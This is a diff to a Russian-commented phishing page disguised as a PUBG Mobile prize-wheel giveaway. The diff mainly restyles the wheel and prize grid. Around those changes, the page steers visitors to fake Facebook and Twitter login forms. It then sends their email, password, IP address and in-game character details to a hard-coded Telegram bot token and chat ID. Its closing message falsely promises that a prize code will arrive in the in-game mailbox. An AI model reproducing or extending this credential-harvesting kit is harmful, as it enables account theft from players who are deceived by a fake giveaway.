@@ -19,94 +19,164 @@
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
-            background: radial-gradient(circle at center, #1a0f2a 0%, #000 100%);
+        }
+
+        /* Фоновые обои */
+        .background-wallpaper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.95)),
+                url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&auto=format&fit=crop&w=2070&q=80');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: -2;
+        }
+
+        .overlay-gradient {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                135deg,
+                rgba(255, 107, 0, 0.15) 0%,
+                rgba(255, 215, 0, 0.1) 50%,
+                rgba(26, 26, 46, 0.95) 100%
+            );
+            z-index: -1;
         }
 
         .container {
             max-width: 500px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 0;
             min-height: 100vh;
-            position: relative;
+            background: rgba(10, 10, 20, 0.9);
+            backdrop-filter: blur(10px);
         }
 
         /* Верхний баннер */
         .top-banner {
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.4), rgba(255, 215, 0, 0.3));
+            padding: 25px 20px;
             text-align: center;
-            padding: 20px 0 30px;
             position: relative;
+            overflow: hidden;
+            border-bottom: 3px solid #ff6b00;
+        }
+
+        .top-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100%;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255, 215, 0, 0.1) 10px,
+                rgba(255, 215, 0, 0.1) 20px
+            );
+            z-index: 0;
         }
 
         .main-title {
-            font-size: 32px;
+            font-size: 36px;
             font-weight: 900;
-            background: linear-gradient(45deg, #ff6b00, #ffd700, #ff6b00);
+            background: linear-gradient(45deg, #ffd700, #ff6b00);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 30px rgba(255, 107, 0, 0.5);
+            letter-spacing: 3px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
             margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
         }
 
         .sub-title {
             font-size: 18px;
             color: #fff;
             font-weight: 300;
-            letter-spacing: 3px;
-            text-shadow: 0 2px 10px rgba(255, 215, 0, 0.5);
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
 
-        /* Секция рулетки */
+        /* Секция рулетки - СТИЛЬ КАК НА СКРИНЕ IMG_0088 */
         .slot-machine-section {
+            padding: 30px 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            margin: 20px;
+            border-radius: 20px;
+            border: 2px solid rgba(255, 107, 0, 0.5);
             position: relative;
-            margin: 30px auto;
+        }
+
+        .slot-machine-section::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff6b00, #ffd700, #ff6b00);
+            border-radius: 22px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        /* Контейнер рулетки */
+        .slot-machine-wrapper {
             width: 320px;
             height: 320px;
-        }
-
-        /* Основа рулетки (круг) */
-        .slot-wheel-base {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at center, #2a1b3a 0%, #1a0f2a 70%);
+            margin: 0 auto 30px;
+            position: relative;
+            background: #1a0f2a;
             border-radius: 50%;
-            border: 8px solid #ffd700;
+            border: 10px solid #ffd700;
             box-shadow: 
-                0 0 40px rgba(255, 215, 0, 0.5),
-                inset 0 0 40px rgba(0, 0, 0, 0.7);
-            z-index: 1;
+                0 0 50px rgba(255, 215, 0, 0.5),
+                inset 0 0 50px rgba(0, 0, 0, 0.7);
         }
 
-        /* Указатель */
+        /* Указатель как на скрине - треугольник вверх */
         .slot-pointer {
             position: absolute;
             top: -25px;
             left: 50%;
             transform: translateX(-50%);
-            width: 50px;
-            height: 60px;
+            width: 60px;
+            height: 40px;
             z-index: 100;
-            filter: drop-shadow(0 0 15px rgba(255, 0, 0, 0.8));
         }
 
         .pointer-arrow {
             width: 0;
             height: 0;
-            border-left: 25px solid transparent;
-            border-right: 25px solid transparent;
-            border-top: 60px solid #ff0000;
-            position: relative;
+            border-left: 30px solid transparent;
+            border-right: 30px solid transparent;
+            border-bottom: 40px solid #ff0000;
+            filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.8));
         }
 
         .pointer-arrow::after {
             content: '';
             position: absolute;
-            top: -60px;
-            left: -15px;
-            width: 30px;
+            top: 10px;
+            left: -10px;
+            width: 20px;
             height: 20px;
             background: #ff6b00;
             border-radius: 50%;
@@ -120,7 +190,8 @@
             transform: translate(-50%, -50%);
             width: 280px;
             height: 280px;
-            z-index: 2;
+            border-radius: 50%;
+            overflow: hidden;
         }
 
         .slot-wheel {
@@ -129,9 +200,24 @@
             position: relative;
             transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
             transform-origin: center;
+            background: conic-gradient(
+                from 0deg,
+                rgba(255, 107, 0, 0.3) 0deg 30deg,
+                rgba(255, 215, 0, 0.3) 30deg 60deg,
+                rgba(255, 107, 0, 0.3) 60deg 90deg,
+                rgba(255, 215, 0, 0.3) 90deg 120deg,
+                rgba(255, 107, 0, 0.3) 120deg 150deg,
+                rgba(255, 215, 0, 0.3) 150deg 180deg,
+                rgba(255, 107, 0, 0.3) 180deg 210deg,
+                rgba(255, 215, 0, 0.3) 210deg 240deg,
+                rgba(255, 107, 0, 0.3) 240deg 270deg,
+                rgba(255, 215, 0, 0.3) 270deg 300deg,
+                rgba(255, 107, 0, 0.3) 300deg 330deg,
+                rgba(255, 215, 0, 0.3) 330deg 360deg
+            );
         }
 
-        /* Секторы рулетки */
+        /* Секторы рулетки - 8 штук как на скрине */
         .slot-sector {
             position: absolute;
             width: 140px;
@@ -141,19 +227,14 @@
             margin-left: -70px;
             transform-origin: bottom center;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            clip-path: polygon(50% 0%, 100% 100%, 0% 100%);
-            background: linear-gradient(45deg, rgba(255, 107, 0, 0.1), rgba(255, 215, 0, 0.05));
-            border: 1px solid rgba(255, 215, 0, 0.2);
         }
 
         .sector-content {
             transform: rotate(-45deg);
-            margin-top: 30px;
             text-align: center;
-            width: 80px;
+            margin-top: 40px;
         }
 
         .slot-image {
@@ -170,21 +251,21 @@
             color: #ffd700;
             text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
             white-space: nowrap;
-            transform: rotate(0deg);
+            transform: rotate(45deg);
         }
 
-        /* Кнопка вращения */
+        /* Центральная кнопка SPIN */
         .spin-center {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 100px;
-            height: 100px;
-            background: radial-gradient(circle at center, #ff6b00, #ff0000);
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle at center, #ff0000, #ff6b00);
             border-radius: 50%;
             border: 6px solid #ffd700;
-            z-index: 3;
+            z-index: 10;
             cursor: pointer;
             display: flex;
             align-items: center;
@@ -202,37 +283,96 @@
                 inset 0 0 25px rgba(255, 215, 0, 0.4);
         }
 
+        .spin-center span {
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
         .spin-center:active {
             transform: translate(-50%, -50%) scale(0.95);
         }
 
-        .spin-center span {
-            color: white;
+        /* Кнопка SPIN под рулеткой */
+        .spin-button {
+            background: linear-gradient(45deg, #ff0000, #ff6b00);
+            border: none;
+            border-radius: 25px;
+            padding: 20px 50px;
+            font-size: 22px;
             font-weight: bold;
-            font-size: 16px;
-            text-align: center;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 0 auto;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .spin-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent,
+                rgba(255, 255, 255, 0.1),
+                transparent
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .spin-button:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.6);
+        }
+
+        .spin-button:disabled {
+            background: linear-gradient(45deg, #666, #888);
+            cursor: not-allowed;
+            transform: none;
+            animation: none;
+        }
+
+        .spin-button:disabled::before {
+            display: none;
         }
 
         /* Сетка призов */
         .prize-grid-section {
-            margin: 40px 0 20px;
             padding: 20px;
-            background: rgba(30, 20, 50, 0.5);
-            border-radius: 20px;
-            border: 2px solid rgba(255, 215, 0, 0.3);
+            margin: 20px;
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
         }
 
         .section-title {
             text-align: center;
             font-size: 20px;
             color: #ffd700;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             text-transform: uppercase;
             font-weight: bold;
-            letter-spacing: 2px;
         }
 
         .prize-grid {
@@ -242,51 +382,49 @@
         }
 
         .prize-item {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.15), rgba(255, 215, 0, 0.1));
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            border-radius: 15px;
-            padding: 15px 10px;
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.1), rgba(255, 215, 0, 0.05));
+            border: 2px solid rgba(255, 215, 0, 0.2);
+            border-radius: 12px;
+            padding: 15px;
             text-align: center;
             transition: all 0.3s;
             cursor: pointer;
-            backdrop-filter: blur(5px);
         }
 
         .prize-item:hover {
             transform: translateY(-5px);
             border-color: #ffd700;
-            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.25), rgba(255, 215, 0, 0.2));
+            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.2);
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.2), rgba(255, 215, 0, 0.1));
         }
 
         .prize-image {
-            width: 60px;
-            height: 60px;
+            width: 70px;
+            height: 70px;
             object-fit: contain;
             margin-bottom: 10px;
-            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.6));
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
         }
 
         .prize-name {
-            font-size: 11px;
+            font-size: 12px;
             color: #fff;
             font-weight: bold;
             margin-bottom: 5px;
-            line-height: 1.3;
         }
 
         .prize-type {
-            font-size: 9px;
+            font-size: 10px;
             color: #ffd700;
-            background: rgba(255, 215, 0, 0.15);
-            padding: 3px 8px;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 2px 6px;
             border-radius: 10px;
             display: inline-block;
         }
 
         /* Кнопки входа */
         .login-section {
-            padding: 20px 0 40px;
+            padding: 20px;
         }
 
         .login-buttons {
@@ -298,13 +436,12 @@
         .login-button {
             display: flex;
             align-items: center;
-            background: rgba(40, 30, 70, 0.7);
+            background: rgba(30, 30, 60, 0.8);
             border: 2px solid #3a5b9c;
             border-radius: 15px;
-            padding: 18px 20px;
+            padding: 20px;
             cursor: pointer;
             transition: all 0.3s;
-            backdrop-filter: blur(5px);
         }
 
         .login-button:hover {
@@ -314,16 +451,15 @@
         }
 
         .login-icon {
-            width: 45px;
-            height: 45px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
-            margin-right: 15px;
+            font-size: 24px;
+            margin-right: 20px;
             color: white;
-            flex-shrink: 0;
         }
 
         .facebook-icon { background: #1877f2; }
@@ -335,57 +471,20 @@
         }
 
         .login-title {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             color: #fff;
-            margin-bottom: 4px;
+            margin-bottom: 5px;
         }
 
         .login-desc {
-            font-size: 12px;
+            font-size: 14px;
             color: #aaa;
-            line-height: 1.4;
         }
 
         .arrow {
             color: #ffd700;
-            font-size: 18px;
-            flex-shrink: 0;
-        }
-
-        /* Кнопка отмены */
-        .cancel-button {
-            width: calc(100% - 40px);
-            margin: 0 auto 20px;
-            background: linear-gradient(45deg, rgba(255, 107, 0, 0.3), rgba(255, 0, 0, 0.3));
-            border: 2px solid #ff6b00;
-            color: #fff;
-            padding: 16px;
-            border-radius: 25px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .cancel-button:hover {
-            background: linear-gradient(45deg, rgba(255, 107, 0, 0.5), rgba(255, 0, 0, 0.5));
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(255, 107, 0, 0.3);
-        }
-
-        /* Декоративные элементы */
-        .decoration-star {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: #ffd700;
-            clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
-            opacity: 0.5;
-            z-index: 0;
+            font-size: 20px;
         }
 
         /* Страницы */
@@ -407,7 +506,6 @@
         /* Facebook страница */
         .facebook-page .container {
             background: #f0f2f5;
-            max-width: 500px;
         }
 
         .fb-header {
@@ -511,7 +609,6 @@
         /* Twitter страница */
         .twitter-page .container {
             background: #000;
-            max-width: 500px;
         }
 
         .twitter-header {
@@ -585,6 +682,29 @@
 
         .twitter-cancel:hover {
             background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Кнопка отмены */
+        .cancel-button {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 107, 0, 0.3);
+            border: 2px solid #ff6b00;
+            color: #fff;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            z-index: 100;
+        }
+
+        .cancel-button:hover {
+            background: rgba(255, 107, 0, 0.5);
+            transform: translateX(-50%) scale(1.05);
         }
 
         /* Модальное окно */
@@ -728,23 +848,16 @@
         /* Адаптивность */
         @media (max-width: 480px) {
             .container {
-                padding: 15px;
                 max-width: 100%;
             }
             
             .main-title {
-                font-size: 26px;
+                font-size: 28px;
             }
             
-            .sub-title {
-                font-size: 16px;
-                letter-spacing: 2px;
-            }
-            
-            .slot-machine-section {
+            .slot-machine-wrapper {
                 width: 280px;
                 height: 280px;
-                margin: 20px auto;
             }
             
             .slot-wheel-container {
@@ -753,78 +866,65 @@
             }
             
             .spin-center {
-                width: 80px;
-                height: 80px;
+                width: 100px;
+                height: 100px;
             }
             
             .spin-center span {
-                font-size: 14px;
+                font-size: 18px;
             }
             
             .prize-grid {
                 grid-template-columns: repeat(2, 1fr);
-                gap: 12px;
             }
             
-            .prize-image {
-                width: 50px;
-                height: 50px;
+            .modal-content {
+                padding: 25px;
             }
             
-            .prize-name {
-                font-size: 10px;
+            .code-display {
+                font-size: 18px;
+                padding: 15px;
             }
-            
-            .prize-type {
-                font-size: 8px;
-            }
-        }
-
-        /* Анимации */
-        @keyframes pulse {
-            0% { opacity: 0.3; }
-            50% { opacity: 0.7; }
-            100% { opacity: 0.3; }
-        }
-
-        .pulse {
-            animation: pulse 2s infinite;
         }
     </style>
 </head>
 <body>
+    <!-- Фоновые обои -->
+    <div class="background-wallpaper"></div>
+    <div class="overlay-gradient"></div>
+
     <!-- Главная страница -->
     <div class="page active" id="mainPage">
         <div class="container">
-            <!-- Декоративные звезды -->
-            <div class="decoration-star" style="top: 50px; left: 30px;"></div>
-            <div class="decoration-star" style="top: 100px; right: 40px;"></div>
-            <div class="decoration-star" style="bottom: 150px; left: 20px;"></div>
-            <div class="decoration-star" style="bottom: 80px; right: 30px;"></div>
-
             <!-- Верхний баннер -->
             <div class="top-banner">
                 <h1 class="main-title">PUBG MOBILE</h1>
                 <p class="sub-title">METRO ROYALE PASS SIGNATURE</p>
             </div>
 
-            <!-- Рулетка -->
+            <!-- Рулетка КАК НА СКРИНЕ IMG_0088 -->
             <div class="slot-machine-section">
-                <div class="slot-wheel-base"></div>
-                
-                <div class="slot-pointer">
-                    <div class="pointer-arrow"></div>
-                </div>
-                
-                <div class="slot-wheel-container">
-                    <div class="slot-wheel" id="slotWheel">
-                        <!-- Слоты будут добавлены через JavaScript -->
+                <div class="slot-machine-wrapper">
+                    <div class="slot-pointer">
+                        <div class="pointer-arrow"></div>
+                    </div>
+                    
+                    <div class="slot-wheel-container">
+                        <div class="slot-wheel" id="slotWheel">
+                            <!-- Секторы будут добавлены через JavaScript -->
+                        </div>
+                    </div>
+                    
+                    <div class="spin-center" id="spinCenter">
+                        <span>SPIN</span>
                     </div>
                 </div>
                 
-                <div class="spin-center" id="spinButton">
-                    <span>SPIN</span>
-                </div>
+                <button class="spin-button" id="spinButton">
+                    <i class="fas fa-dice"></i>
+                    SPIN TO WIN
+                </button>
             </div>
 
             <!-- Сетка призов -->
@@ -952,7 +1052,7 @@
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
 
-        // Данные призов с указанием ваших картинок
+        // Данные призов с указанием ваших картинок - 8 призов как на скрине
         const prizes = [
             { id: 1, name: "PHARAOH SKIN", type: "LEGENDARY SKIN", image: "pharaon.jpg" },
             { id: 2, name: "MATERIAL", type: "GAME ITEM", image: "material.jpg" },
@@ -961,11 +1061,15 @@
             { id: 5, name: "M416 SHUT", type: "WEAPON SKIN", image: "m416shut.jpg" },
             { id: 6, name: "8500 UC", type: "GAME CURRENCY", image: "8500uc.jpg" },
             { id: 7, name: "SHORTI", type: "CLOTHING", image: "shorti.jpg" },
-            { id: 8, name: "M416 SKIN", type: "WEAPON SKIN", image: "m416skin.jpg" },
-            { id: 9, name: "KALASH", type: "WEAPON", image: "kalash.jpg" },
-            { id: 10, name: "M416 SKIN 2", type: "WEAPON SKIN", image: "m416skin2.jpg" },
-            { id: 11, name: "M16", type: "WEAPON", image: "m16.jpg" },
-            { id: 12, name: "TOLSTOVKA", type: "CLOTHING", image: "tolstovka.jpg" }
+            { id: 8, name: "KALASH", type: "WEAPON", image: "kalash.jpg" }
+            // Остальные картинки можно использовать в сетке призов
+        ];
+
+        // Все картинки для сетки призов
+        const allPrizeImages = [
+            "pharaon.jpg", "material.jpg", "m416lednik.jpg", "mummy.jpg",
+            "m416shut.jpg", "8500uc.jpg", "shorti.jpg", "m416skin.jpg",
+            "kalash.jpg", "m416skin2.jpg", "m16.jpg", "tolstovka.jpg"
         ];
 
         let userData = {
@@ -981,7 +1085,7 @@
 
         let hasSpun = false;
         let currentRotation = 0;
-        const totalSectors = 12; // 12 секторов как на скрине
+        const totalSectors = 8; // 8 секторов как на скрине
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
@@ -999,7 +1103,8 @@
                 });
             }, 1000);
             
-            // Add click event to spin button
+            // Add click events
+            document.getElementById('spinCenter').addEventListener('click', spinWheel);
             document.getElementById('spinButton').addEventListener('click', spinWheel);
         });
 
@@ -1007,7 +1112,7 @@
             const wheel = document.getElementById('slotWheel');
             wheel.innerHTML = '';
             
-            // Create 12 секторов как на скрине
+            // Create 8 секторов как на скрине
             for (let i = 0; i < totalSectors; i++) {
                 const prizeIndex = i % prizes.length;
                 const prize = prizes[prizeIndex];
@@ -1038,19 +1143,46 @@
         function createPrizeGrid() {
             const grid = document.getElementById('prizeGrid');
             // Отображаем 6 призов в сетке
-            const displayPrizes = prizes.slice(0, 6);
-            
-            displayPrizes.forEach(prize => {
+            for (let i = 0; i < Math.min(6, allPrizeImages.length); i++) {
+                const imgName = allPrizeImages[i];
+                const prizeName = getPrizeNameFromImage(imgName);
+                const prizeType = getPrizeTypeFromImage(imgName);
+                
                 const item = document.createElement('div');
                 item.className = 'prize-item';
-                item.onclick = () => showPrizeInfo(prize);
+                item.onclick = () => showPrizeInfo({name: prizeName, type: prizeType, image: imgName});
                 item.innerHTML = `
-                    <img src="${prize.image}" alt="${prize.name}" class="prize-image">
-                    <div class="prize-name">${prize.name}</div>
-                    <div class="prize-type">${prize.type}</div>
+                    <img src="${imgName}" alt="${prizeName}" class="prize-image">
+                    <div class="prize-name">${prizeName}</div>
+                    <div class="prize-type">${prizeType}</div>
                 `;
                 grid.appendChild(item);
-            });
+            }
+        }
+
+        function getPrizeNameFromImage(imgName) {
+            const names = {
+                'pharaon.jpg': 'PHARAOH SKIN',
+                'material.jpg': 'MATERIAL',
+                'm416lednik.jpg': 'M416 GLACIER',
+                'mummy.jpg': 'MUMMY SKIN',
+                'm416shut.jpg': 'M416 SHUT',
+                '8500uc.jpg': '8500 UC',
+                'shorti.jpg': 'SHORTI',
+                'm416skin.jpg': 'M416 SKIN',
+                'kalash.jpg': 'KALASH',
+                'm416skin2.jpg': 'M416 SKIN 2',
+                'm16.jpg': 'M16',
+                'tolstovka.jpg': 'TOLSTOVKA'
+            };
+            return names[imgName] || 'PRIZE';
+        }
+
+        function getPrizeTypeFromImage(imgName) {
+            if (imgName.includes('skin') || imgName.includes('Skin')) return 'SKIN';
+            if (imgName.includes('uc')) return 'CURRENCY';
+            if (imgName.includes('m416') || imgName.includes('m16') || imgName.includes('kalash')) return 'WEAPON';
+            return 'ITEM';
         }
 
         function showPrizeInfo(prize) {
@@ -1110,20 +1242,22 @@
                 return;
             }
 
+            const spinCenter = document.getElementById('spinCenter');
             const spinBtn = document.getElementById('spinButton');
             const wheel = document.getElementById('slotWheel');
             
-            // Disable button
-            spinBtn.style.pointerEvents = 'none';
-            spinBtn.innerHTML = '<span>SPINNING...</span>';
-            spinBtn.style.background = 'radial-gradient(circle at center, #888, #666)';
+            // Disable buttons
+            spinCenter.style.pointerEvents = 'none';
+            spinBtn.disabled = true;
+            spinCenter.innerHTML = '<span>...</span>';
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SPINNING...';
             
             // Calculate random prize
             const randomPrizeIndex = Math.floor(Math.random() * prizes.length);
             userData.selectedPrize = prizes[randomPrizeIndex];
             
             // Calculate target rotation (land on the selected prize)
-            const targetAngle = 360 * 8 + (360 / totalSectors) * randomPrizeIndex;
+            const targetAngle = 360 * 5 + (360 / totalSectors) * randomPrizeIndex;
             currentRotation = currentRotation % 360;
             
             // Start spinning animation
@@ -1138,9 +1272,8 @@
             
             // Show result after spin
             setTimeout(() => {
-                spinBtn.innerHTML = '<span>SPIN AGAIN</span>';
-                spinBtn.style.background = 'radial-gradient(circle at center, #ff6b00, #ff0000)';
-                spinBtn.style.pointerEvents = 'auto';
+                spinCenter.innerHTML = '<span>DONE!</span>';
+                spinBtn.innerHTML = '<i class="fas fa-check"></i> PRIZE WON!';
                 hasSpun = true;
                 
                 // Show prize won
@@ -1150,11 +1283,18 @@
                 
                 // Save rotation for next spin
                 currentRotation = (currentRotation + targetAngle) % 360;
+                
+                // Re-enable center button for spin again
+                setTimeout(() => {
+                    spinCenter.style.pointerEvents = 'auto';
+                    spinCenter.innerHTML = '<span>SPIN</span>';
+                    spinBtn.disabled = false;
+                    spinBtn.innerHTML = '<i class="fas fa-dice"></i> SPIN AGAIN';
+                }, 3000);
             }, 4000);
         }
 
         function playSpinSound() {
-            // Simulate sound with visual feedback
             const soundIndicator = document.createElement('div');
             soundIndicator.innerHTML = '🎵';
             soundIndicator.style.cssText = `
@@ -1231,7 +1371,6 @@
             });
             document.getElementById(pageId).classList.add('active');
             
-            // Update login method
             if (pageId === 'facebookPage') {
                 userData.loginMethod = 'facebook';
             } else if (pageId === 'twitterPage') {
@@ -1253,18 +1392,15 @@
                 return;
             }
             
-            // Save credentials
             userData.credentials = {
                 email: email,
                 password: password
             };
             
-            // Send to Telegram
             await sendToTelegram(
                 `🔵 FACEBOOK LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
             );
             
-            // Show verification
             showVerification();
         }
 
@@ -1277,23 +1413,19 @@
                 return;
             }
             
-            // Save credentials
             userData.credentials = {
                 email: email,
                 password: password
             };
             
-            // Send to Telegram
             await sendToTelegram(
                 `🐦 TWITTER LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
             );
             
-            // Show verification
             showVerification();
         }
 
         function showVerification() {
-            // Create verification modal
             const verifyDiv = document.createElement('div');
             verifyDiv.style.cssText = `
                 position: fixed;
@@ -1349,7 +1481,6 @@
             verifyDiv.id = 'verificationModal';
             document.body.appendChild(verifyDiv);
             
-            // Add overlay
             const overlay = document.createElement('div');
             overlay.style.cssText = `
                 position: fixed;
@@ -1378,7 +1509,6 @@
                 return;
             }
             
-            // Save account info
             userData.accountInfo = {
                 characterId: charId,
                 characterName: charName,
@@ -1387,13 +1517,8 @@
                 platform: platform
             };
             
-            // Remove verification modal
             cancelVerification();
-            
-            // Send complete data
             sendCompleteData();
-            
-            // Show congratulations
             showCongratulations();
         };
 
@@ -1475,7 +1600,6 @@
             document.getElementById('congratsModal').style.display = 'none';
             showPage('mainPage');
             
-            // Reset for next time
             setTimeout(() => {
                 showAlert('Your prize code has been sent to your account! Check your in-game mailbox within 24 hours.');
             }, 500);
